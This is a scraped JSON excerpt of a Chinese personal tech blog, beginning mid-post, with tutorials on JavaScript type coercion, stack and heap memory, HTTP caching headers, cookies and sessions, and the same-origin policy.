Null]toString.call(true); // [object Boolean]toString.call(1); // [object Number]toString.call(NaN); // [object Number]toString.call(&#x27;1&#x27;); // [object String]toString.call(fn); // [object Function]toString.call([1,2,3]); // [object Array] 1.1.4 其他 APIArray.isArray() 用于判断某个数据是否为数组， polyfill 实现如下： 123Array.isArray = Array.isArray || function(array)&#123; return Object.prototype.toString.call(array) === &#x27;[object Array]&#x27;;&#125; Number.isNaN() 方法确定传递的值是否为 NaN，并且检查其类型是否为 Number。 polyfill 实现如下： 123Number.isNaN = Number.isNaN || function(value) &#123; return typeof value === &quot;number&quot; &amp;&amp; isNaN(value);&#125; isNaN() 方法用来确定一个值是否为 NaN，因为 NaN !== NaN 将某些不能强制转换为数值的非数值转换为数值，或者算术运算返回一个未定义的或无法表示的值，会得到 NaN如果 isNaN 函数的参数不是 Number 类型， isNaN 函数会首先尝试将这个参数转换为数值，然后才会对转换后的结果是否是 NaN 进行判断，推荐使用 Number.isNaN() 1234var isNaN = function(value) &#123; var n = Number(value); return n !== n;&#125;; 1.2 undefined 与 undeclared 未被声明的变量，如 b，调用时报错 ReferenceError: b is not defined 已被声明但未赋值的变量，如 let a， 直接调用时输出 undefined typeof 有一个特殊的安全防范机制，变量未被声明时也返回 undefined 1234567const &#123; log &#125; = consolevar a;log(a); // undefinedlog(b); // ReferenceError: b is not definedlog(typeof a); // undefinedlog(typeof b); // undefined 1.3 机器精度比较两个浮点数最常见的方法是设置一个误差范围值，通常称为“机器精度”，对 JavaScript 的数字来说，这个值通常是 2^-52 (2.220446049250313e-16) 。 123456789101112// 为 ES6 之前的版本写 polyfillif (!Number.EPSILON) &#123; Number.EPSILON = Math.pow(2, -52);&#125;function numbersCloseEnoughToEqual(n1,n2) &#123; return Math.abs( n1 - n2 ) &lt; Number.EPSILON;&#125;var a = 0.1 + 0.2;var b = 0.3;numbersCloseEnoughToEqual(a, b); // truenumbersCloseEnoughToEqual(0.0000001, 0.0000002); // false 1234567891011121314151617181920212223242526// Q: 去数值的整数部分和小数部分// A: 使用 parseInt// 不推荐使用，不准确 &amp; 性能问题var a = 3.5parseInt(a) // 3var b = 0.0000000000001 // 1e-13parseInt(b) // 1// A: 使用 Math.ceil()、Math.floor()function trunc(num) &#123; if(num &gt;= 0) return Math.floor(num); return Math.ceil(num);&#125;trunc(3.75); // 3trunc(-3.75); // -3// A: 使用 % 运算console.log(3.75 % 1); // 0.75console.log(-3.75 % 1); // -0.75// A: 使用位运算console.log(~~3.75); // 3console.log(~~-3.75); // -3 todo: 取整数部分和小数部分2、对象、字符串、数字和布尔值之间类型转换规则2.1 内部属性 [[class]]所有 typeof 返回值为 &quot;object&quot; 的对象都包含一个内部属性 [[Class]] （看作一个内部的分类），这个属性无法直接访问，一般通过 Object.prototype.toString() 来查看 123456const toString = Object.prototype.toString;toString.call(null); // [object Null]toString.call(undefined); // [object Undefined]toString.call(true); // [object Boolean]toString.call([]); // [object Array] 2.2 toStringTagSymbol.toStringTag 是一个内置 symbol，它通常作为对象的属性键使用，对应的属性值应该为字符串类型，这个字符串用来表示该对象的自定义类型标签，通常只有内置的 Object.prototype.toString() 方法会去读取这个标签并把它包含在自己的返回值里。 许多内置的 JavaScript 对象类型即便没有 toStringTag 属性，也能被 toString() 方法识别并返回特定的类型标签，比如： 1234567Object.prototype.toString.call(&#x27;foo&#x27;); // &quot;[object String]&quot;Object.prototype.toString.call([1, 2]); // &quot;[object Array]&quot;Object.prototype.toString.call(3); // &quot;[object Number]&quot;Object.prototype.toString.call(true); // &quot;[object Boolean]&quot;Object.prototype.toString.call(undefined); // &quot;[object Undefined]&quot;Object.prototype.toString.call(null); // &quot;[object Null]&quot;// ... and more 另外一些对象类型则不然，toString() 方法能识别它们是因为引擎为它们设置好了 toStringTag 标签： 1234Object.prototype.toString.call(new Map()); // &quot;[object Map]&quot;Object.prototype.toString.call(function* () &#123;&#125;); // &quot;[object GeneratorFunction]&quot;Object.prototype.toString.call(Promise.resolve()); // &quot;[object Promise]&quot;// ... and more 但你自己创建的类不会有这份特殊待遇，toString() 找不到 toStringTag 属性时只好返回默认的 Object 标签： 123class ValidatorClass &#123;&#125;Object.prototype.toString.call(new ValidatorClass()); // &quot;[object Object]&quot; 加上 toStringTag 属性，你的类也会有自定义的类型标签了： 1234567class ValidatorClass &#123; get [Symbol.toStringTag]() &#123; return &quot;Validator&quot;; &#125;&#125;Object.prototype.toString.call(new ValidatorClass()); // &quot;[object Validator]&quot; 2.3 ToPrimitive 抽象操作ToPrimitive(input, PreferredType) 是JavaScript引擎内部的抽象操作，原理如下：可选参数 PreferredType 可以是 Number 或者 String，它只代表了一个转换的偏好，转换结果不一定必须是这个参数所指的类型，但转换结果一定是一个原始值。 PreferredType 被标志为 Number 时： 如果输入的值已经是个原始值，则直接返回它 如果输入的值是一个对象，则调用该对象的 valueOf() 方法，如果 valueOf() 方法的返回值是一个原始值，则返回这个原始值 否则，调用这个对象的 toString() 方法，如果 toString() 方法的返回值是一个原始值，则返回这个原始值 否则，抛出 TypeError 异常 PreferredType 被标志为 String 时转换规则类似，不同的是先调用 toString() 方法，再调用 valueOf() 方法 如果没有 PreferredType 参数，则 PreferredType 的值会按照这样的规则来自动设置：Date 类型的对象会被设置为 String，其它类型的值会被设置为 Number（先调用 valueOf） 1234567891011121314151617181920var obj = &#123; valueOf () &#123; console.log(&#x27;valueOf&#x27;); return &#123;&#125;; &#125;, toString () &#123; console.log(&#x27;toString&#x27;); return &#123;&#125;; &#125;,&#125;Number(obj);// valueOf// toString// TypeError: Cannot convert object to primitive valueString(obj);// toString// valueOf// TypeError: Cannot convert object to primitive value 类型 valueOf() toString() Boolean true 或 false ‘true’或者 ‘false’ Number 数值 数值的字符串形式 String 返回该对象表示的字符串值 返回该对象表示的字符串值 Object 返回该对象 ‘[object Object]’ Array 返回该数组 以,分割的字符串，类似Array.join(‘,’) Date 返回日期的毫秒数 返回带有时区信息的日期和时间 RegExp 返回该正则函数 返回正则表达式字面量 Function 返回该函数 将函数代码以字符串形式返回 3 类型转换3.1 ToNumbernumber 转换规则： true 转换为 1 false 转换为 0 ， undefined 转换为 NaN null 转换为 0 字符串转为数字 为了将值转换为相应的基本类型值，抽象操作 ToPrimitive 会首先检查该值是否有 valueOf() 方法，如果有并且返回基本类型值，就使用该值进行强制类型转换。如果没有就使用 toString() 的返回值（如果存在）来进行强制类型转换，否则会产生 TypeError 错误。 1234567891011121314151617181920var a = &#123; valueOf() &#123; return &quot;42&quot;; &#125;&#125;;var b = &#123; toString() &#123; return &quot;42&quot;; &#125;&#125;;var c = [4, 2];c.toString = function () &#123; return this.join(&quot;&quot;);&#125;;Number(a); // 42Number(b); // 42Number(c); // 42Number(&quot;&quot;); // 0Number([]); // 0Number([&quot;abc&quot;]); // NaN 3.2 ToString字符串化规则： null 转换为 &quot;null&quot; undefined 转换为 &quot;undefined&quot; true 转换为 &quot;true&quot;， 数字转换为普通字符串（较大或较小数值使用指数形式） 普通对象使用 toString() （ Object.prototype.toString() ）返回内部属性 [[Class]] 的值，如 &quot;[object Object]&quot;。 如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值数组的默认 toString() 方法经过了重新定义，将所有单元字符串化以后再用 “,” 连接 12345678910111213141516171819202122var num = &#x27;123456789&#x27;;var flag = true;var n = null;var u = undefined;var obj = &#123; name: &#x27;xxb&#x27; &#125;;var obj2 = &#123; name: &#x27;xxb&#x27;, toString() &#123; return this.name + &#x27;-------&#x27;; &#125;&#125;var arr = [1, 2, 3];var error = new Error(&#x27;123&#x27;);num.toString(); // 123456789flag.toString(); // truen + &#x27;&#x27;; // nullu + &#x27;&#x27;; // undefinedobj.toString(); // [object Object]obj2.toString(); // xxb-------arr.toString(); // 1,2,3error.toString(); // Error: 123 3.3 ToBooleanundefined、null、false、+0 、 -0 和 NaN、&quot;&quot; 将转换为 false，其他值转换为 true 所有的对象都会转换为 true，包括{}、new Boolean(false)、new Number(0)、new String(‘’) 12345678910!! null // false!! &#x27;&#x27; // false!!NaN // false!!new Boolean(false) // true!!new Number(0); // true!!new String(&quot;&quot;); // true!! &quot;false&quot;; // true!! &quot;0&quot;; // true!! &quot;&#x27;&#x27;&quot;; // true!!&#123;&#125;; // true 字符串和数字之间的转换是通过 String(..) 和 Number(..) 这两个内建函数（原生构造函数，参见第 3 章）来实现的，请注意它们前面没有 new 关键字，并不创建封装对象。~ 和 indexOf() 一起可以将结果强制类型转换（实际上仅仅是转换）为真 / 假值~ 比 &gt;= 0 和 == -1 更简洁 3.4 JSON 字符串化 字符串、数字、布尔值和 null 的 JSON.stringify() 规则与 ToString 基本相同。 如果传递给 JSON.stringify() 的对象中定义了 toJSON() 方法，那么该方法会在字符串化前调用，以便将对象转换为安全的 JSON 值。 所有安全的 JSON 值都可以使用 JSON.stringify() 字符串化。 不安全的 JSON 值指 undefined 、 function 、 symbol和包含循环引用的对象，JSON.stringify() 在对象中遇到 undefined 、 function 和 symbol 时会自动将其忽略，在数组中则会返回 null （以保证单元位置不变） 如果对象中定义了 toJSON() 方法，JSON 字符串化时会首先调用该方法，然后用它的返回值来进行序列化。如果要对含有非法 JSON 值的对象做字符串化，或者对象中的某些值无法被序列化时，就需要定义 toJSON() 方法来返回一个安全的 JSON 值。 toJSON() 返回的应该是一个适当的值，可以是任何类型，然后再由 JSON.stringify() 对其进行字符串化 12345678910111213JSON.stringify(undefined); // undefinedJSON.stringify(function()&#123;&#125;); // undefinedJSON.stringify([1, undefined, function()&#123;&#125;, 4]); // &quot;[1,null,null,4]&quot;JSON.stringify(&#123; a:2, b:function()&#123;&#125;&#125;); // &quot;&#123;&quot;a&quot;:2&#125;&quot;var obj = &#123; name: &#x27;xxb&#x27;, age: 24, toJSON () &#123; return this.name; &#125;&#125;JSON.stringify(undefined); // &quot;xxb&quot; 4 隐式转换4.1 隐式强制转换为 String+ 运算符即能用于数字加法，也能用于字符串拼接， + 运算符也能是一元运算符，将后面的操作数转换为数字 ES5 规范定义：如果某个操作数是字符串或者能够通过以下步骤转换为字符串的话，+ 将进行拼接操作。如果其中一个操作数是对象（包括数组），则首先对其调用 ToPrimitive 抽象操作，该抽象操作再调用 [[DefaultValue]] ，以数字作为上下文。 其中一个操作数是字符串（或者通过 ToPrimitive 得到字符串），则执行字符串拼接，否则执行数字加法 12345678910111213var a = &#123; valueOf: function () &#123; return 42; &#125;, toString: function () &#123; return 4; &#125;&#125;;a + &quot;&quot;; // &quot;42&quot;String(a); // &quot;4&quot;// a + &quot;&quot; 会对 a 调用 valueOf() 方法，然后通过 ToString 抽象操作将返回值转换为字符串。// String(a) 则是直接调用 ToString() 123456789101112[1, 2] + [3, 4] // &#x27;1,23,4&#x27;42 + &#x27;&#x27; // &#x27;42&#x27;[] + &#123;&#125; // &#x27;[object Object]&#x27;&#123; &#125; +[] // 0 `&#123;&#125;` 被当做代码块 + &#x27;42&#x27; // 42&#x27;42&#x27; - 0 // 42&#x27;42&#x27; - &#x27;12&#x27; // 32[32] - [21] // 11 [32] - [2, 1] // NaN 隐式强制转换为 Number123456789101112// boolean 转换为 number// 也可使用 Number(boolean) 进行隐式转换function booleanToNum() &#123; let sum = 0; for (let i = 0; i &lt; arguments.length; i++) &#123; if (arguments[i]) &#123; sum += 1; &#125; &#125; return sum;&#125;booleanToNum(true, false, true) 隐式强制转换为Boolean下面的情况会发生隐式强制类型 Boolean 转换： if (..) 语句中的条件判断表达式。 for ( .. ; .. ; .. ) 语句中的条件判断表达式（第二个）。 while (..) 和 do..while(..) 循环中的条件判断表达式。 ? :中的条件判断表达式。 逻辑运算符 || （逻辑或）和 &amp;&amp; （逻辑与）左边的操作数（作为条件判断表达式）。 var a = 42; var b = &quot;abc&quot;; var c; var d = null; if (a) &#123; console.log(&quot;yep&quot;); // yep &#125; while (c) &#123; console.log(&quot;nope, never runs&quot;); &#125; c = d ? a : b; c; // &quot;abc&quot; if ((a &amp;&amp; d) || c) &#123; console.log(&quot;yep&quot;); // yep &#125;```","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"栈内存与堆内存","slug":"JavaScript/栈内存与堆内存","date":"2021-01-27T04:24:48.000Z","updated":"2021-04-30T06:15:50.732Z","comments":true,"path":"2021/01/27/JavaScript/栈内存与堆内存/","link":"","permalink":"https://xuxb.github.io/2021/01/27/JavaScript/%E6%A0%88%E5%86%85%E5%AD%98%E4%B8%8E%E5%A0%86%E5%86%85%E5%AD%98/","excerpt":"","text":"栈内存与堆内存1、栈内存概念：存放基本类型的变量和对象的引用，比如 boolean、string、number 等，分配在栈内存区。 特点： 存取速度较快 数据可以共享 生命周期固定，缺乏灵活性 2、堆内存概念：存放复杂数据类型（引用类型），比如 Object、 Array 等，系统不知道需要多大空间，需程序自己申请，分配在堆内存区。 特点： 存取速度较慢 存放大量数据，每份数据的地址都不一样（通过 new 方式创建） 3、为什么区分栈内存和堆内存？通常与垃圾回收机制有关，为了使程序运行时占用的内存最小。 当一个方法执行时，每个方法都会建立自己的内存栈，在这个方法内定义的变量将会逐个放入这块栈内存里，随着方法的执行结束，这个方法的内存栈也将自然销毁了。因此，所有在方法中定义的变量都是放在栈内存中的； 当我们在程序中创建一个对象时，这个对象将被保存到运行时数据区中，以便反复利用（因为对象的创建成本通常较大），这个运行时数据区就是堆内存。堆内存中的对象不会随方法的结束而销毁，即使方法结束后，这个对象还可能被另一个引用变量所引用（方法的参数传递时很常见）， 则这个对象依然不会被销毁，只有当一个对象没有任何引用变量引用它时，系统的垃圾回收机制才会在核实的时候回收它。 栈使用的是一级缓存， 通常都是被调用时处于存储空间中，调用完毕立即释放堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定，调用的速度要相对来得低一些 4、调用栈概念：函数中的 调用栈（call stack） 指由 栈帧￼（stack frame） 或叫 活动记录（activation record）构成的栈 函数调用的局部状态中的数据存活时间满足 “后入先出”（LIFO）顺序，与算法中的栈结构有相同的机制，所以叫做调用栈。 对于同步调用的函数，其调用逻辑是递归的，被调用者的局部信息所占空间的分配总是后于调用者的（后入），而其释放则总是先于调用者的（先出），所以使用栈结构是最简捷的一种方式（不一定必须用栈） 12345678910111213141516main() a() b() c() - main() | +&gt; - a() . | . +&gt; - b() . . | . . +&gt; - c() . . . | . . + &lt;- return from c() . . | . + &lt;- return from b() . | + &lt;- return from a() | - return from main() 算法中的栈、堆、队列栈：一种后进先出的的数据结构队列：一种先进先出的的数据结构堆：可以被看成是一棵树，如：堆排序","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"HTTP 缓存","slug":"HTTP/HTTP 缓存","date":"2021-01-14T07:45:00.000Z","updated":"2021-04-30T07:17:49.980Z","comments":true,"path":"2021/01/14/HTTP/HTTP 缓存/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/HTTP%20%E7%BC%93%E5%AD%98/","excerpt":"","text":"HTTP 缓存1、强缓存说明：强缓存直接从浏览器缓存中获取，不发送请求到服务器使用：用Cache-Control、 Expires 头信息 1.1 强缓存相关头信息 Cache-Control: HTTP/1.1 标准， 使用相对时间（从生成文档开始计时，推荐使用，优先级高于 Expires） Expires：HTTP/1.0 标准，使用绝对时间（依赖计算器本地时间，可能不准确） 123456789&#x2F;&#x2F; Request Header If-None-Match: &quot;2a043f-6741-5456e5e0050c3&quot; If-Modified-Since: Fri, 06 Jan 2017 15:06:49 GMT&#x2F;&#x2F; Response Header Cache-Control: max-age&#x3D;2592000 Expires: Sat, 18 Feb 2017 08:31:00 GMT ETag: &quot;2a043f-6741-5456e5e0050c3&quot;Last-Modified: Fri, 06 Jan 2017 15:06:49 GMT 1.2 Cache-Control 头信息字段 Cache-directive 说明 private 私有缓存，即内容只缓存到私有缓存中(仅客户端可以缓存，代理服务器不可缓存)，默认为 private public 公有缓存，即所有内容都将被缓存(客户端和代理服务器都可缓存) no-store 禁止进行缓存，即所有内容都不会被缓存到缓存或 Internet 临时文件中 no-cache 强制确认缓存，即必须先与服务器确认返回的响应是否被更改（该请求应该会带有与本地缓存相关的验证字段），然后才能使用该响应来满足后续对同一个网址的请求。因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，如果资源未被更改，可以避免下载。 must-revalidation/proxy-revalidation 过期校验缓存，即超过设定的过期时间后会重新检验新鲜度，通常与 max-age 配合使用，如果缓存的内容失效，请求必须发送到服务器/代理以进行重新验证 immutable 不可变的缓存，即表示该资源是不可变的（如资源名称加了指纹信息，md5 戳等），不用重新验证新鲜度，所以不必向服务器发送请求，直接从缓存中获取，也可设置 max-age 为过期时间 max-age=xxx 缓存的内容将在 xxx 秒后失效, 这个选项只在 HTTP 1.1可用, 并如果和 Last-Modified 一起使用时, 优先级较高 stale-while-revalidate 提供的是一个宽限期（由 max-age=xxx ），当检查新版本时，允许浏览器在这段宽限期期间使用过期的（旧的）资源 stale-if-error 如果重新验证资源时返回了 5xx 之类的错误，stale-if-error 会给浏览器一个使用旧的响应的宽限期 Clear-Site-Data：实验性质的响应头，表示清除当前请求网站有关的浏览器数据（cookie，存储，缓存），可选值为 cache、cookies、storage 或 *，如登出时可设置响应头为 Clear-Site-Data: &quot;cache&quot;, &quot;cookies&quot;, &quot;storage&quot; 通常情况下，因为访问页面的 url 不能改变，所以不对 html 文件作缓存处理，可设置 Cache-Control: max-age=0，对于 js、css 等经常改变且含指纹信息的资源，可设置 Cache-Control: public, max-age=31536000000 1.3 缓存校验 用户点击刷新按钮时会开始缓存验证。如果缓存的响应头信息里含有 “Cache-control: must-revalidate” 的定义，在浏览的过程中也会触发缓存验证。另外，在浏览器偏好设置里设置Advanced-&gt;Cache为强制验证缓存也能达到相同的效果。当缓存的文档过期后，需要进行缓存验证或者重新获取资源。只有在服务器返回强校验器或者弱校验器时才会进行验证。 作为缓存的一种强校验器，ETag 响应头是一个对用户代理(User Agent, 下面简称UA)不透明（译者注：UA 无需理解，只需要按规定使用即可）的值。对于像浏览器这样的HTTP UA，不知道ETag代表什么，不能预测它的值是多少。如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 If-None-Match 头来验证缓存。Last-Modified 响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。如果响应头里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。 2、协商缓存说明：先发送请求给服务器，如果命中缓存，则从浏览器缓存中获取使用：用 Last-Modificd 和 If-Modificd-Since、Etag 和 If-None-Match 头信息 分布式系统里多台机器间文件的 last-modified 必须保持一致，以免负载均衡到不同机器导致比对失败 分布式系统尽量关闭掉 Etag (每台机器生成的 Etag 都会不一样) Etag: 实体标签（版本标识符），用于表示文档的版本号、序列号、内容校验或指纹信息，表明文档是否被修改 Last-Modified 标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间，如果某些文件会被定期生成，当有时内容并没有任何变化，但 Last-Modified 却改变了，导致文件没法使用缓存，有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。 Etag、If-None-Match Etag：web 服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器觉得）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。 If-None-Match：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。 Last-Modified、If-Modified-Since Last-Modified：标示这个响应资源的最后修改时间。web服务器在响应请求时，告诉客户端资源的最后修改时间。 If-Modified-Since：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Last-Modified声明，则再次向web服务器请求时带上头 If-Modified-Since，表示请求时间。web服务器收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对。若最后修改时间较新，说明资源被改动过，则响应整片资源内容（写在响应消息包体内），则响应HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省流量)，告知浏览器继续使用所保存的cache。 3、其他 新鲜度 理论上来讲，当一个资源被缓存存储后，该资源应该可以被永久存储在缓存中。由于缓存只有有限的空间用于存储资源副本，所以缓存会定期地将一些副本删除，这个过程叫做缓存驱逐。另一方面，当服务器上面的资源进行了更新，那么缓存中的对应资源也应该被更新，由于HTTP是C/S模式的协议，服务器更新一个资源时，不可能直接通知客户端及其缓存，所以双方必须为该资源约定一个过期时间，在该过期时间之前，该资源（缓存副本）就是新鲜的，当过了过期时间后，该资源（缓存副本）则变为陈旧的。驱逐算法用于将陈旧的资源（缓存副本）替换为新鲜的，注意，一个陈旧的资源（缓存副本）是不会直接被清除或忽略的，当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个If-None-Match头，然后发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 304 (Not Modified)（该响应不会有带有实体信息），则表示此资源副本是新鲜的，这样一来，可以节省一些带宽。若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。 对于含有特定头信息的请求，会去计算缓存寿命。比如Cache-control: max-age=N的请求头，相应的缓存的寿命就是N。通常情况下，对于不含这个属性的请求则会去查看是否包含Expires属性，通过比较Expires的值和头里面Date属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的Last-Modified信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%） 资源加速 不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。 这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的css和js文件，避免这种不一致性是非常重要的。 浏览器缓存 200 ok : 从原始服务器请求成功 200 ok from cache : 从缓存中获取，未向服务器验证新鲜度 200 ok from disk cache : 从磁盘中获取（已缓存到磁盘中，如CSS样式等） 200 ok from memory cache : 从内存中获取（已缓存到磁盘并存在内存中，如脚本、字体、图片等） 304 not modified ：向服务器发送请求，验证新鲜度，足够新鲜，服务器会返回 304状态 页面刷新 当 F5 刷新页面时，跳过强缓存功能，检查协商缓存（与在地址栏中输入url的作用一样） 当 Ctrl + F5 刷新页面时，跳过强缓存和协商缓存 （直接从服务器中加载）","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"Cookie","slug":"Web 安全/cookie","date":"2021-01-14T07:45:00.000Z","updated":"2021-04-30T07:22:51.262Z","comments":true,"path":"2021/01/14/Web 安全/cookie/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/cookie/","excerpt":"","text":"CookieCookieCookie是网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据，是实现持久会话的最好方式 cookie 属性| 选项 | 作用 || — | — || name | 设置 cookie 的名称 || value | 设置 cookie 的值 || domain | 设置可以访问此 cookie 的域名 || path | 设置可以访问此 cookie 的页面路径，比如domain是abc.com,path是/test，那么只有/test路径下的页面可以读取此cookie || expires/Max-Age | 设置字段为此cookie超时时间。若设置其值为一个时间，那么当到达此时间后，此cookie失效。不设置的话默认值是Session，意思是cookie会和session一起失效。当浏览器关闭(不是浏览器标签页，而是整个浏览器) 后，此cookie失效。 || size | 表示此 cookie 大小 || http | 设置 cookie 的 httponly 属性。若此属性为true，则只有在http请求头中会带有此cookie的信息，而不能通过document.cookie来访问此cookie。 || secure | 设置是否只能通过https来传递此条cookie || sameSite | 允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）| SameSite Cookies 可选字段 None: 浏览器会在同站请求、跨站请求下继续发送cookies，不区分大小写 Lax: 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者frames的调用，但只有当用户从外部站点导航到URL时才会发送。如 link链接，预加载请求，GET 表单 Strict: 浏览器将只在访问相同站点时发送cookie。 Cookie 的分类 会话Cookie：不包含过期时间，该Cookie保存在内存中，当浏览器关闭时该Cookie失效 持久性Cookie：包含过期时间，该Cookie保存在硬盘内，当到达指定日期时，该Cookie失效 123&#x2F;&#x2F; 响应头中设置 CookieSet-Cookie: name1&#x3D;value1 [ ;expires&#x3D;date][ ;domain&#x3D;domain][ ;path&#x3D;path][ ;secure]Set-Cookie: name2&#x3D;value2 [ ;expires&#x3D;date][ ;domain&#x3D;domain][ ;path&#x3D;path][ ;secure] 12&#x2F;&#x2F; 请求头中的 CookieCookie: name1&#x3D;value1; name2&#x3D;value2; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// js 操作 Cookie/** * 根据cookie名称获取cookie值 * @param &#123;String&#125; name cookie名称 * @return &#123;[type]&#125; [description] */function getCookie(name) &#123; var arr = document.cookie.match(new RegExp(&quot;(^|\\\\W)&quot; + name + &quot;=([^;]*)(;|$)&quot;)); if (arr !== null) &#123; return decodeURIComponent(arr[2]); &#125; return &#x27;&#x27;;&#125;/** * @param &#123;Object&#125; options 参数配置 * @param &#123;String&#125; options.name cookie的名称 * @param &#123;String&#125; options.value cookie的值 * @param &#123;String&#125; options.domain cookie访问权限域名，默认为当前域名 * @param &#123;String&#125; options.path 默认为 / * @param &#123;Date&#125; options.expires 如果不设置或不是 Date 类型，则默认为会话 cookie * @return &#123;scope&#125; this */function setCookie(options) &#123; var name = options.name; var value = options.value; var path = options.path || &quot;/&quot;; var domain = options.domain; var expires = options.expires; var str = name + &quot;=&quot; + escape(value) + &quot;; &quot;; str += &quot;path=&quot; + path + &quot;; &quot;; if (domain) &#123; str += &quot;domain=&quot; + domain + &quot;; &quot;; &#125; if (expires instanceof Date) &#123; str += &quot;expires=&quot; + expires.toGMTString() + &quot;; &quot;; &#125; document.cookie = str; return this;&#125;/*** 删除 cookie* @param &#123;String&#125; name cookie 名称* @param &#123;String&#125; domain cookie 域* @param &#123;String&#125; path cookie 路径* @return &#123;scope&#125; this*/function deleteCookie(name, domain, path) &#123; this.set(&#123; name: name, value: &#x27;&#x27;, domain: domain, path: path, expires: new Date() &#125;); return this;&#125; SessionSession 是一种服务器端机制，具有保持连接的含义。当浏览器第一次访问时，服务器创建 Session，然后将 Session的 Id 以 Cookie 的形式发送回给浏览器，后续的访问会带上 Cookie，可用于识别用户，起到面向连接的作用。 Session 对象在一段时间（如20min）没被使用，就会被销毁，或手动销毁 Session 注意事项 用户访问某个网站，登录成功后，服务器后生成一个 Session 对象，并设置失效时间，用于跟踪用户的操作和状态，并将Session产生的唯一标识符保存在Cookie中（即通过 Set-Cookie 响应头返回给浏览器，假设为 SessionId ），在一段时间内，用户访问其他页面时，会将Cookie（包含SessionId）传回给服务器，以此模拟”登陆态”功能。 当用户关闭浏览器时，浏览器并不会发送任何信息到服务器，因此服务器端的 Session 依然有效，直到 Session 超过设置的时间，若这段时间内获取 SessionId 的值并传给服务器（如CSFR、XSS），依然可以保持为登陆状态，并获取该用户的所有权限。 session 在服务器端用类似于 Map 结构的形式存储，当标签页或浏览器关闭时并不会通知到后端清除 sessionsessionStorage 用于存储前端数据，当标签页或浏览器关闭时 sessionStorage 中的数据会被清除","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"},{"name":"cookie","slug":"cookie","permalink":"https://xuxb.github.io/tags/cookie/"}]},{"title":"同源策略（SOP）","slug":"Web 安全/同源策略(SOP)","date":"2021-01-14T07:44:00.000Z","updated":"2021-04-30T07:34:20.135Z","comments":true,"path":"2021/01/14/Web 安全/同源策略(SOP)/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5(SOP)/","excerpt":"","text":"同源策略（SOP）同源策略（Same Origin Policy） 定义：除非所处的两个页面的协议、DNS域名、端口都完全一致，否则两个独立的 JavaScript 运行环境不能访问彼此的 DOM，其他任何跨文档的 JavaScript DOM 访问也会失败。 说明：两个 URL 的协议、域名和端口相同，则表示他们同源。对于不同源的 document 或脚本，对当前 document 读取或设置某些属性。 协议、元素、端口三者组成的算法叫做 源。 同源策略开始时只是用于现在对 DOM 结构的访问，之后扩展为保护 JavaScript 对跟对象下的某些敏感数据，如 cookie、localStoreage、Ajax 请求等，但同源策略机制并非包含所有，如非同源的脚本对任意窗口调用 location.assign() 、location.replace()。 作用：防止跨域读写某些资源，为浏览器提供沙箱环境，使进程在一个相对独立的空间运行，能在一定程度上保护浏览器安全。 同源策略无法和全局身份认证、SSL 状态、网络上下文环境以及众多有浏览器管理涉及安全的其他参数进行同步A 网站载入 B 网站的脚本，则该脚本的源为 A 